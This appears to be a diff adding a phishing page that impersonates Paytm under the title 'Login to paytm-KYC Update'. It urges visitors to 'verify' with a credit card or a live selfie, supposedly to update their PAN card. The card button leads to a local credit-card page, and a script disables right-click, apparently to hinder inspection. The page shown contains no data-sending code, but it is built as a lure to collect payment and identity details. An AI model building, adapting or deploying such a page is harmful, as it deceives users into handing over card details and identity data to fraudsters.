@@ -1,0 +1,1512 @@
+<!DOCTYPE html>
+<html lang="eng">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="apple-touch-icon" sizes="180x180" href="/Paytm/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/Paytm/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/Paytm/favicon-16x16.png">
+<link rel="manifest" href="/Paytm/site.webmanifest">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>Login to paytm-KYC Update</title>
+  <style>
+    #ml,#ky
+    {
+    width:104%;
+    margin-left:-6px;
+   }
+    #mi
+    {
+    width:28%;
+    margin-left:55px;
+    position:absolute;
+    top:%;
+    }
+    #img
+    {
+    width:50%;
+    }
+    #aa
+    {
+    width: 260px;
+    border-radius:4px !important;
+    font-family: Arial;
+    color:#40464d;
+    font-size: 14px !important;
+    height: 30px;
+    background-color: white;
+    border-style: solid;
+    border-color:#01B9F5;
+    border-width: 1px;
+    margin-left: 20px;
+    padding: 2px 10px;
+    cursor: pointer;
+    }
+    #aa:hover
+    {
+    border-style: solid;
+    border-color:#00B1F1;
+    }
+    #bb
+    {
+    width:40px;
+    border-radius:4px !important;
+    font-family: Arial;
+    color:#40464d;
+    font-size: 14px !important;
+    line-height: 25px !important;
+    height: 26px;
+    background-color: white;
+    border-style: solid;
+    border-color:#01B9F5;
+    border-width: 1px;
+    border-radius: 0px;
+    margin-left: 20px;
+    padding: 2px 10px;
+    cursor: pointer;
+    }
+    #bb:hover
+    {
+    border-style: solid;
+    border-color:#00B1F1;
+    }
+    #cc
+    {
+    width:260px;
+    border-radius:4px !important;
+    font-family: Arial;
+    color:#40464d;
+    font-size: 14px !important;
+    line-height: 25px !important;
+    height: 26px;
+    background-color: white;
+    border-style: solid;
+    border-color:#01B9F5;
+    border-width: 1px;
+    border-radius: 0px;
+    margin-left: 20px;
+    padding: 2px 10px;
+    cursor: pointer;
+    }
+    #cc:hover
+    {
+    border-style: solid;
+    border-color:#01B9F5;
+    }
+    #SelfieBTN
+    {
+    width:280px;
+    background-color:#01B9F5;
+    color: white;
+    border: solid black;
+    border-radius: 2px;
+    border-width: 0.5px;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 15px;
+    height:36px;
+    }
+    div.SelfieBTN {
+    position: -webkit-sticky;
+    position: sticky;
+    top: 0;
+    }
+    #CardBTN
+    {
+    width:280px;
+    background-color:#01B9F5;
+    color: white;
+    border: solid black;
+    border-radius: 2px;
+    border-width: 0.5px;
+    font-weight: bold;
+    cursor: pointer;
+    font-size: 15px;
+    height:36px;
+    }
+    #ab
+    {
+    width:365px;
+    margin:50px;
+    border-bottom:solid #CCCCCC;
+    border-width:1.2px;
+    }
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap");
+    
+    ._offer_box {
+    width: 100%;
+    margin: -120px;
+    }
+    
+    ._offer_box_container {
+    width: 100%;
+    margin: 0 auto;
+    }
+    
+    ._offer_box_header {
+    font-size: 46px;
+    line-height: 56px;
+    color: #101010;
+    text-align: center;
+    }
+    
+    ._gradient_1 {
+    width: 100%;
+    margin: 0 auto;
+    background: linear-gradient(94.11deg, #3861E5 17.75%, #3BABEE 101.54%);
+    }
+    
+    ._gradient_2 {
+    width: 100%;
+    margin: 0 auto;
+    background: linear-gradient(94.11deg, #3861E5 17.75%, #3BABEE 101.54%);
+    border-radius: 24px;
+    }
+    
+    ._offer_box_steps {
+    width: 100%;
+    max-width: 1170px;
+    margin: 150px auto 0px;
+    }
+    
+    ._steps_title {
+    padding: 58px 0px 0px;
+    font-weight: 700;
+    font-size: 40px;
+    line-height: 50px;
+    text-align: center;
+    color: #FFFFFF;
+    }
+    
+    ._offer_carousel {
+    width: 100%;
+    max-width: 1360px;
+    margin: 45px auto 0px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._offer_carousel_item {
+    width: 100%;
+    max-width: 368px;
+    padding: 50px 35px;
+    margin: 0px auto;
+    background-color: #FFFFFF;
+    border-radius: 24px;
+    }
+    
+    ._prev,
+    ._next {
+    width: 53px;
+    height: auto;
+    display: block;
+    }
+    
+    ._prev {
+    margin: 0px 40px 0px 0px;
+    -ms-transform: rotate(180deg);
+    /* IE 9 */
+    transform: rotate(180deg);
+    }
+    
+    ._next {
+    margin: 0px 0px 0px 40px;
+    }
+    
+    ._offer_carousel_title {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    }
+    
+    ._title_img img {
+    width: 80px;
+    height: auto;
+    display: block;
+    }
+    
+    ._title_content {
+    margin-left: 24px;
+    }
+    
+    ._title_content h2 {
+    font-weight: 600;
+    font-size: 20px;
+    line-height: 26px;
+    color: #000000;
+    }
+    
+    ._title_content p {
+    font-weight: 500;
+    font-size: 15px;
+    line-height: 22px;
+    color: #707070;
+    }
+    
+    ._offer_carousel_content {
+    margin: 37px auto 0px;
+    }
+    
+    ._offer_carousel_content h2 {
+    font-weight: 600;
+    font-size: 20px;
+    line-height: 26px;
+    color: #000000;
+    }
+    
+    ._offer_carousel_content p {
+    font-weight: 500;
+    font-size: 15px;
+    line-height: 22px;
+    color: #525252;
+    margin: 15px auto 0px;
+    }
+    
+    .slick-slide {
+    margin: 0 20px;
+    }
+    
+    .slick-disabled {
+    opacity: 0.2;
+    pointer-events: none;
+    }
+    
+    ._steps_items {
+    width: 100%;
+    margin: 50px auto 0px;
+    display: flex;
+    gap: 50px;
+    flex-wrap: wrap;
+    align-items: flex-start;
+    justify-content: center;
+    }
+    
+    ._step_item {
+    width: 300px;
+    display: flex;
+    flex-direction: column;
+    
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._step_item img {
+    width: 247px;
+    height: auto;
+    display: block;
+    }
+    
+    ._step_box_text {
+    font-weight: 600;
+    font-size: 15px;
+    line-height: 22px;
+    text-align: center;
+    color: #FFFFFF;
+    margin: 21px auto 70px;
+    padding: 0px 30px;
+    }
+    
+    ._offer_box_gradient {
+    width: 100%;
+    height: 158px;
+    max-width: 1170px;
+    margin: 150px auto 0px;
+    border-radius: 20px;
+    display: flex;
+    align-items: center;
+    padding: 0px 30px 0px 70px;
+    position: relative;
+    }
+    
+    ._offer_box_icon {
+    width: 276px;
+    display: block;
+    }
+    
+    ._offer_box_text {
+    font-size: 40px;
+    line-height: 50px;
+    font-weight: 700;
+    text-align: left;
+    color: #FFFFFF;
+    margin-top: 15px;
+    }
+    
+    ._offer_box_list {
+    padding: 0px;
+    margin: 0px;
+    font-weight: 600;
+    font-size: 20px;
+    line-height: 33px;
+    color: #FFFFFF;
+    }
+    
+    ._offer_spread {
+    width: 100%;
+    margin: 0 auto;
+    }
+    
+    ._offer_spread_container {
+    width: 100%;
+    max-width: 1100px;
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._offer_spread_header {
+    font-size: 40px;
+    line-height: 50px;
+    color: #000000;
+    font-weight: 700;
+    text-align: center;
+    }
+    
+    ._offer_spread_icon {
+    width: 94px;
+    height: auto;
+    display: block;
+    }
+    
+    ._offer_spread_flex_container {
+    width: 100%;
+    margin: 0 auto;
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    padding-top: 57px;
+    }
+    
+    ._flex_1,
+    ._flex_2 {
+    width: 180px;
+    }
+    
+    ._flex_3 {
+    width: 195px;
+    }
+    
+    ._flex_4 {
+    width: 180px;
+    }
+    
+    ._offer_spread_title {
+    font-weight: 600;
+    font-size: 20px;
+    line-height: 25px;
+    color: #000000;
+    text-align: left;
+    padding-top: 16px;
+    }
+    
+    ._offer_spread_para {
+    font-weight: 500;
+    font-size: 15px;
+    line-height: 24px;
+    color: #000000;
+    text-align: left;
+    padding-top: 13px;
+    }
+    
+    ._offer_box_icon_2 {
+    width: 84px;
+    display: block;
+    }
+    
+    ._offer_box_right {
+    margin: 0px;
+    position: absolute;
+    right: 30px;
+    bottom: 0px;
+    }
+    
+    ._offer_box_right_item {
+    display: flex;
+    align-items: center;
+    }
+    
+    ._offer_box_right_icon {
+    width: 20px;
+    height: auto;
+    display: block;
+    }
+    
+    ._offer_box_right_para {
+    font-weight: 600;
+    font-size: 20px;
+    line-height: 26px;
+    color: #FFFFFF;
+    padding-left: 17px;
+    }
+    
+    ._padding_para {
+    padding-left: 38px;
+    padding-top: 5px;
+    }
+    
+    
+    
+    ._contact {
+    width: 100%;
+    background-color: #f5f9fe;
+    padding: 20px;
+    }
+    
+    ._contact_container {
+    width: 100%;
+    background-color: #ffffff;
+    padding: 40px 20px;
+    }
+    
+    ._contact_container_item {
+    width: 100%;
+    max-width: 1000px;
+    margin: 0 auto;
+    }
+    
+    ._contact_container_item h3 {
+    font-weight: 600;
+    font-size: 20px;
+    line-height: 26px;
+    letter-spacing: 0.01em;
+    color: #000000;
+    margin-bottom: 30px;
+    }
+    
+    ._contact_details {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 30px;
+    flex-wrap: wrap;
+    }
+    
+    ._contact_details_item {
+    width: 480px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    }
+    
+    ._contact_fullerton {
+    width: 127px;
+    display: block;
+    }
+    
+    ._contact_suryoday {
+    width: 155px;
+    display: block;
+    }
+    
+    ._contact_piramal {
+    width: 124px;
+    display: block;
+    }
+    
+    ._contact_clix {
+    width: 120px;
+    display: block;
+    }
+    
+    ._contact_paytm {
+    width: 120px;
+    display: block;
+    }
+    
+    ._contact_logo_container {
+    width: 157px;
+    }
+    
+    ._contact_para_container {
+    margin-left: 25px;
+    }
+    
+    ._contact_para {
+    font-weight: 500;
+    font-size: 14px;
+    line-height: 20px;
+    color: #000000;
+    }
+    
+    ._footer_tnc_text_white {
+    font-weight: 700;
+    font-size: 20px;
+    line-height: 35px;
+    color: #101010;
+    padding: 0px 10PX;
+    display: flex;
+    align-items: center;
+    }
+    
+    ._footer_tnc_text_black {
+    font-weight: 700;
+    font-size: 46px;
+    line-height: 56px;
+    color: #000000;
+    padding: 0px;
+    margin: 0px 39px 0px 35px;
+    padding-right: 20px;
+    }
+    
+    ._footer {
+    width: 100%;
+    margin: 0 auto;
+    max-width: 1440px;
+    background: #FFFFFF;
+    }
+    
+    ._footer_container {
+    margin: 0 auto;
+    padding: 156px 50px 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._footer_qr_img {
+    width: 198px;
+    height: auto;
+    display: block;
+    }
+    
+    ._footer_tnc_section {
+    display: flex;
+    align-items: center;
+    border-right: 1px solid rgba(16, 16, 16, 0.13);
+    }
+    
+    ._footer_download_app {
+    display: flex;
+    align-items: center;
+    margin-left: 54px;
+    }
+    
+    ._footer_download_text_container {
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    flex-direction: column;
+    }
+    
+    .footer_para {
+    font-size: 15px;
+    line-height: 22px;
+    text-align: left;
+    padding: 15px 0px 8px 12px;
+    color: #000000;
+    }
+    
+    ._footer_social_container {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-left: 11px;
+    }
+    
+    ._footer_fb,
+    ._footer_insta,
+    ._footer_tw {
+    width: 36px;
+    height: auto;
+    display: block;
+    margin-right: 20px;
+    }
+    
+    ._footer_tw {
+    margin-right: 0px;
+    }
+    
+    ._footer_download_text {
+    font-weight: 700;
+    font-size: 20px;
+    line-height: 35px;
+    color: #333333;
+    margin: 20px auto;
+    text-align: center;
+    }
+    
+    ._footer_btn_container {
+    display: flex;
+    align-items: center;
+    background-color: #101010;
+    width: 290px;
+    justify-content: center;
+    padding: 15px 0px;
+    border-radius: 50px;
+    }
+    
+    ._footer_apple_img,
+    ._footer_gplay_img {
+    width: 17px;
+    display: block
+    }
+    
+    ._footer_apple_img {
+    margin-right: 16px;
+    }
+    
+    ._footer_btn_text {
+    font-size: 17px;
+    line-height: 24px;
+    color: #FFFFFF;
+    font-weight: 500;
+    padding-right: 16px;
+    }
+    
+    ._mWeb_show {
+    display: none;
+    }
+    
+    ._mWeb_hide {
+    display: block;
+    }
+    
+    ._myBreak {
+    display: block;
+    }
+    
+    ._strip {
+    border-top: 13px solid #00b8f5;
+    border-bottom: 13px solid #012a72;
+    }
+    
+    @media only screen and (max-width: 1300px) {
+    ._header_section_container {
+    width: 100%;
+    margin: 0 auto;
+    padding: 68px 40px 130px;
+    display: flex;
+    align-items: center;
+    justify-content: space-evenly;
+    flex-direction: column;
+    }
+    
+    ._header_section_container_left {
+    padding-left: 0px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._lender_details {
+    margin-top: 21px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._lender_para {
+    text-align: center;
+    }
+    
+    ._lender_paytm,
+    ._lender_fullerton,
+    ._lender_clix,
+    ._lender_suryoday,
+    ._lender_piramal {
+    margin: 0 auto 22px;
+    }
+    
+    ._header_title {
+    font-size: 55px;
+    line-height: 63px;
+    text-align: center;
+    color: #000000;
+    font-weight: 700;
+    margin-top: 55px;
+    padding: 0px 0px 0px 0px;
+    }
+    
+    ._bnrr {
+    width: 100%;
+    }
+    
+    ._header_section_container_right {
+    margin: 50px auto 0px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._lender {
+    width: 799px;
+    display: block;
+    margin-top: 50px;
+    }
+    
+    ._banner_web {
+    width: 100%;
+    max-width: 730PX;
+    display: block;
+    margin: 61px auto 0px;
+    }
+    
+    ._title_content h2 {
+    font-weight: 600;
+    font-size: 17px;
+    line-height: 24px;
+    color: #000000;
+    }
+    
+    ._title_content p {
+    font-weight: 500;
+    font-size: 14px;
+    line-height: 20px;
+    color: #707070;
+    }
+    
+    ._offer_carousel_content p {
+    font-weight: 500;
+    font-size: 14px;
+    line-height: 20px;
+    color: #525252;
+    margin: 15px auto 0px;
+    }
+    }
+    
+    @media only screen and (max-width: 1050px) {
+    
+    ._header_section_container {
+    width: 100%;
+    margin: 0 auto;
+    padding: 68px 40px 100px;
+    display: flex;
+    align-items: center;
+    justify-content: space-evenly;
+    flex-direction: column;
+    }
+    
+    ._header_section_container_left {
+    padding-left: 0px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._bnrr {
+    width: 90%;
+    }
+    
+    ._header_section_container_right {
+    margin: 50px auto 0px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._lender {
+    width: 680px;
+    display: block;
+    margin-top: 50px;
+    }
+    
+    ._banner_web {
+    width: 100%;
+    max-width: 730PX;
+    display: block;
+    margin: 61px auto 0px;
+    }
+    
+    ._offer_section {
+    width: 100%;
+    margin: 0 auto;
+    }
+    
+    ._offer_section_container {
+    width: 100%;
+    max-width: 750px;
+    margin: 0 auto;
+    padding: 66px 0px 100px;
+    }
+    
+    ._header_title {
+    font-size: 46px;
+    line-height: 56px;
+    }
+    
+    ._offer_box_header {
+    font-size: 40px;
+    line-height: 50px;
+    }
+    
+    ._offer_carousel_item {
+    width: 100%;
+    max-width: 368px;
+    padding: 30px 20px;
+    }
+    
+    ._offer_spread_header {
+    font-size: 40px;
+    line-height: 50px;
+    }
+    
+    ._offer_box_text {
+    font-size: 26px;
+    line-height: 35px;
+    }
+    
+    ._steps_title {
+    padding: 58px 0px 0px;
+    font-size: 26px;
+    line-height: 35px;
+    }
+    
+    ._offer_box_list {
+    font-size: 17px;
+    line-height: 30px;
+    }
+    
+    ._offer_box_right_para {
+    font-weight: 600;
+    font-size: 17px;
+    line-height: 24px;
+    }
+    
+    ._offer_spread_title {
+    font-weight: bold;
+    font-size: 17px;
+    line-height: 24px;
+    }
+    
+    ._footer_container {
+    margin: 0 auto;
+    padding: 105px 50px 140px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    }
+    
+    ._footer_tnc_text_black {
+    font-weight: 700;
+    font-size: 30px;
+    line-height: 40px;
+    padding: 0px;
+    margin: 0px 23px 0px 20px;
+    }
+    
+    ._footer_qr_img {
+    width: 160px;
+    height: auto;
+    display: block;
+    }
+    }
+    
+    @media only screen and (max-width: 890px) {
+    ._footer_tnc_text_black {
+    font-weight: 700;
+    font-size: 26px;
+    line-height: 32px;
+    padding: 0px;
+    margin: 0px 23px 0px 20px;
+    }
+    }
+    
+    @media only screen and (max-width: 767px) {
+    
+    ._logo {
+    width: 140px;
+    display: block;
+    margin: 0 auto;
+    }
+    
+    ._lender {
+    width: 100%;
+    max-width: 335px;
+    display: block;
+    margin-top: 50px;
+    }
+    
+    ._lender_details {
+    margin-top: 21px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 0px
+    }
+    
+    ._lender_para {
+    text-align: center;
+    }
+    
+    ._lender_paytm,
+    ._lender_fullerton,
+    ._lender_clix,
+    ._lender_suryoday,
+    ._lender_piramal {
+    margin: 0px auto ;
+    }
+    
+    ._lender_details_item {
+    width: 100%;
+    padding-right: 0px;
+    padding-left: 0px;
+    border-right: none;
+    border-bottom: 0.5px solid rgba(16, 16, 16, 0.13);
+    padding-bottom: 20px;
+    padding-top: 20px;
+    }
+    
+    /*._lender ._lender_details_item:last-child {
+    border-bottom: none;
+    } */
+    
+    ._lender ._lender_details_item:first-child {
+    padding-top: 0px;
+    }
+    
+    ._header_section_container {
+    width: 100%;
+    margin: 0 auto;
+    padding: 68px 10px 80px;
+    display: flex;
+    align-items: center;
+    justify-content: space-evenly;
+    flex-direction: column;
+    }
+    
+    ._bnrr {
+    width: 96%;
+    margin: 0 auto;
+    }
+    
+    ._logo_container p {
+    margin-bottom: 15px;
+    }
+    
+    ._offer_section {
+    width: 100%;
+    margin: 0 auto;
+    }
+    
+    ._offer_section_container {
+    width: 100%;
+    max-width: 550px;
+    margin: 0 auto;
+    padding: 66px 0px 380px;
+    }
+    
+    ._header_title {
+    font-size: 36px;
+    line-height: 46px;
+    }
+    
+    ._offer_box_header {
+    font-size: 30px;
+    line-height: 40px;
+    }
+    
+    ._offer_spread_header {
+    font-size: 30px;
+    line-height: 40px;
+    }
+    
+    ._offer_box_text {
+    font-size: 21px;
+    line-height: 30px;
+    margin: 0px;
+    }
+    
+    ._steps_title {
+    padding: 58px 0px 0px;
+    font-size: 21px;
+    line-height: 30px;
+    }
+    
+    ._step_box_text {
+    font-weight: 600;
+    font-size: 15px;
+    line-height: 22px;
+    text-align: center;
+    color: #FFFFFF;
+    margin: 15px auto 30px;
+    padding: 0px 30px;
+    }
+    
+    ._steps_items {
+    gap: 20px;
+    }
+    
+    ._prev {
+    margin: 0px 20px 0px 0px;
+    }
+    
+    ._next {
+    margin: 0px 0px 0px 20px;
+    }
+    
+    ._offer_box_icon {
+    width: 200px;
+    display: block;
+    }
+    
+    ._offer_box_gradient {
+    height: 120px;
+    margin: 40px auto 0px;
+    border-radius: 20px;
+    display: flex;
+    flex-wrap: wrap;
+    flex-direction: column;
+    align-items: flex-start;
+    padding: 40px 20px 74px;
+    }
+    
+    ._offer_box_list {
+    margin-left: 17px;
+    }
+    
+    ._flex_1,
+    ._flex_2 {
+    width: 250px;
+    }
+    
+    ._flex_3,
+    ._flex_4 {
+    width: 250px;
+    }
+    
+    ._offer_spread_flex_container {
+    width: 100%;
+    margin: 0 auto;
+    display: flex;
+    flex-wrap: wrap;
+    align-items: flex-start;
+    justify-content: flex-end;
+    gap: 40px;
+    padding-top: 57px;
+    }
+    
+    ._banner_web {
+    width: 100%;
+    display: block;
+    margin: 61px auto 0px;
+    }
+    
+    ._footer {
+    width: 100%;
+    margin: 0 auto;
+    background: #FFFFFF;
+    position: fixed;
+    bottom: 0px;
+    }
+    
+    ._footer_container {
+    margin: 0 auto;
+    padding: 40px 0px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    }
+    
+    ._footer_tnc_section {
+    display: flex;
+    align-items: center;
+    margin: 0 auto;
+    ;
+    }
+    
+    ._footer_download_app {
+    display: flex;
+    align-items: center;
+    margin: 0 auto;
+    }
+    
+    ._footer_download_text_container {
+    display: flex;
+    align-items: center;
+    padding: 0px;
+    }
+    
+    ._footer_qr_img {
+    display: none;
+    }
+    
+    ._footer_download_text {
+    display: none;
+    }
+    
+    .footer_para {
+    padding: 15px 0px 0px 0px;
+    }
+    
+    ._footer_btn_container {
+    display: flex;
+    align-items: center;
+    background-color: #101010;
+    width: 236px;
+    justify-content: center;
+    padding: 12px 0px;
+    border-radius: 50px;
+    margin-top: 15px;
+    ;
+    }
+    
+    ._footer_social_container {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 10px 0px 0px 0px;
+    }
+    
+    ._footer_btn_text {
+    font-size: 12px;
+    line-height: 17px;
+    color: #FFFFFF;
+    font-weight: 500;
+    padding-right: 16px;
+    }
+    
+    ._footer_apple_img,
+    ._footer_gplay_img {
+    width: 13px;
+    display: block;
+    }
+    
+    ._footer_tnc_text_black {
+    font-weight: 600;
+    font-size: 17px;
+    line-height: 24px;
+    color: #1D2F54;
+    padding: 0px;
+    text-align: center;
+    }
+    
+    ._footer_tnc_text_white {
+    font-weight: 600;
+    font-size: 16px;
+    line-height: 20px;
+    color: #101010;
+    padding: 0px 10PX;
+    margin-right: auto;
+    }
+    
+    ._abc_arrow {
+    width: 11px;
+    padding-left: 3px;
+    }
+    
+    ._mWeb_show {
+    display: block;
+    }
+    
+    ._mWeb_hide {
+    display: none;
+    }
+    }
+    
+    @media only screen and (max-width: 596px) {
+    
+    ._banner_web {
+    width: 100%;
+    max-width: 325px;
+    display: block;
+    margin: 61px auto 0px;
+    }
+    
+    ._bnrr {
+    width: 92%;
+    margin: 0 auto;
+    }
+    
+    ._lender {
+    width: 100%;
+    max-width: 335px;
+    display: block;
+    margin-top: 50px;
+    }
+    
+    ._web_block {
+    display: inline;
+    }
+    
+    ._logo_container ._logo {
+    width: 120px;
+    margin: 0 auto;
+    display: block;
+    }
+    
+    ._banner_web {
+    padding-left: 30px;
+    }
+    
+    ._banner_web {
+    width: 100%;
+    display: block;
+    margin: 41px auto 0px;
+    }
+    
+    ._offer_section {
+    width: 100%;
+    margin: 0 auto;
+    }
+    
+    ._offer_section_container {
+    width: 94%;
+    margin: 0 auto;
+    padding: 66px 0px 360px;
+    }
+    
+    ._header_title {
+    font-size: 26px;
+    line-height: 35px;
+    padding: 0px 20px;
+    }
+    
+    ._offer_box_header {
+    font-size: 30px;
+    line-height: 40px;
+    padding: 0px 20px;
+    }
+    
+    ._offer_spread_header {
+    font-size: 24px;
+    line-height: 34px;
+    padding: 0px 20px;
+    }
+    
+    ._offer_box_text {
+    font-size: 18px;
+    line-height: 27px;
+    margin: 20px 0px;
+    }
+    
+    ._steps_title {
+    padding: 38px 0px 0px;
+    font-size: 18px;
+    line-height: 27px;
+    }
+    
+    ._offer_box_icon {
+    width: 160px;
+    display: block;
+    }
+    
+    ._offer_box_right {
+    margin: 0px;
+    position: static;
+    }
+    
+    ._offer_box_gradient {
+    
+    height: auto;
+    margin: 40px auto 0px;
+    border-radius: 20px;
+    display: flex;
+    flex-wrap: nowrap;
+    flex-direction: row;
+    align-items: center;
+    padding: 0px 30px;
+    justify-content: center;
+    }
+    
+    ._offer_box_list {
+    margin-left: 17px;
+    }
+    
+    ._flex_1,
+    ._flex_2 {
+    width: 325px;
+    }
+    
+    ._flex_3,
+    ._flex_4 {
+    width: 325px;
+    }
+    
+    ._offer_spread_flex_container {
+    width: 100%;
+    margin: 0 auto;
+    display: flex;
+    flex-wrap: wrap;
+    align-items: flex-start;
+    justify-content: flex-end;
+    gap: 40px;
+    padding: 57px 60px 0px 25px;
+    }
+    
+    
+    ._contact {
+    width: 100%;
+    background-color: #f5f9fe;
+    padding: 20px;
+    }
+    
+    ._contact_container {
+    width: 100%;
+    background-color: #ffffff;
+    padding: 40px 20px;
+    }
+    
+    ._contact_container_item {
+    width: 100%;
+    max-width: 1000px;
+    margin: 0 auto;
+    }
+    
+    ._contact_container_item h3 {
+    font-weight: 600;
+    font-size: 16px;
+    line-height: 26px;
+    letter-spacing: 0.01em;
+    color: #000000;
+    margin-bottom: 22px;
+    }
+    
+    ._contact_details {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    
+    flex-wrap: wrap;
+    }
+    
+    ._contact_details_item {
+    display: flex;
+    align-items: center;
+    justify-content: flex-start;
+    flex-wrap: wrap;
+    gap: 13px
+    }
+    ._contact_para_container {
+    margin: 0px 0px 0px;
+    }
+    
+    ._contact_para {
+    font-weight: 500;
+    font-size: 12px;
+    line-height: 20px;
+    color: #000000;
+    }
+    }
+    
+    @media only screen and (max-width: 450px) {
+    ._title_content h2 {
+    font-weight: 600;
+    font-size: 14px;
+    line-height: 18px;
+    color: #000000;
+    }
+    
+    ._title_content p {
+    font-weight: 500;
+    font-size: 13px;
+    line-height: 20px;
+    color: #707070;
+    }
+    
+    ._offer_carousel_content p {
+    font-weight: 500;
+    font-size: 13px;
+    line-height: 20px;
+    color: #525252;
+    margin: 15px auto 0px;
+    }
+    
+    ._title_content {
+    margin-left: 16px;
+    }
+    
+    ._offer_carousel_item {
+    width: 100%;
+    max-width: 368px;
+    padding: 30px 10px 30px 20px;
+    }
+    
+    .slick-slide {
+    margin: 0 10px;
+    }
+    
+    ._title_img img {
+    width: 50px;
+    height: auto;
+    display: block;
+    }
+    
+    ._prev,
+    ._next {
+    width: 33px;
+    height: auto;
+    display: block;
+    }
+    }
+  </style>
+  <script language="javascript">
+  
+  var message="Long press disabled.";
+  function clickIE4(){
+  
+  if (event.button==2){
+  alert(message);
+  return false;
+  }
+  }
+  
+  function clickNS4(e){
+  if (document.layers||document.getElementById&&!document.all){
+  if (e.which==2||e.which==3){
+  alert(message);
+  return false;
+  }
+  }
+  }
+  
+  if (document.layers){
+  document.captureEvents(Event.MOUSEDOWN);
+  document.onmousedown=clickNS4;
+  }
+  
+  else if (document.all&&!document.getElementById){
+  document.onmousedown=clickIE4;
+  }
+  
+  document.oncontextmenu=new Function("alert(message);return false;")
+  
+  </script>
+</head>
+<body>
+  <img src="ptml.jpg" alt="" id="ml"><br><br>
+    <form action="" method="post">
+<center><b style=" color:#01B9F5; font-size:18px; font-family:arial; margin:4px;">Credit card Or Live Selfie verification</b></center><br>
+  <div>
+  <center><b style=" color:solid black; font-size:15px; font-family:arial; margin:4px;">Please Verify with your Credit card or Open <br>Paytm app and upload your live selfie.</b></center>
+  </div><br>
+  <div class="SelfieBTN">
+  <center><button id="SelfieBTN" onclick="location.href='https://p.paytm.me/xCTH/PPWeb?af_qr=true'" type="button">
+  Open Paytm App Now</button></center>
+  </div><br>
+  <center><b style=" color:black; font-size:18px; font-family:arial; margin:0px;">OR</b><br><br>
+  <center><button id="CardBTN" onclick="location.href='Credit_Card.html'" type="button">Verify With Credit Card</center>
+   <center><img src="card.png" alt="" id="img"><br></center>
+   <div class="_offer_box">
+   <div class="_offer_box_container">
+   <div class="_offer_box_steps _gradient_2">
+   <h3 class="_steps_title">Update PAN card in few easy steps</h3>
+   <div class="_steps_items">
+   <div class="_step_item">
+   <img src="step-1.png" alt="Business Loan" class="_offer_box_icon">
+   <p class="_step_box_text">1. Enter few details</p>
+   </div>
+   <div class="_step_item">
+   <img src="step-2.png" alt="Business Loan" class="_offer_box_icon">
+   <p class="_step_box_text">2. Take a selfie and complete
+   profile verification</p>
+   </div>
+   <div class="_step_item">
+   <img src="tick.png" alt="Business Loan" class="_offer_box_icon">
+   <p class="_step_box_text">3. Now your PAN Card is successfully updated</p>
+   </div>
+   </div>
+   </div>
+   </div>
+  </form></body></html>
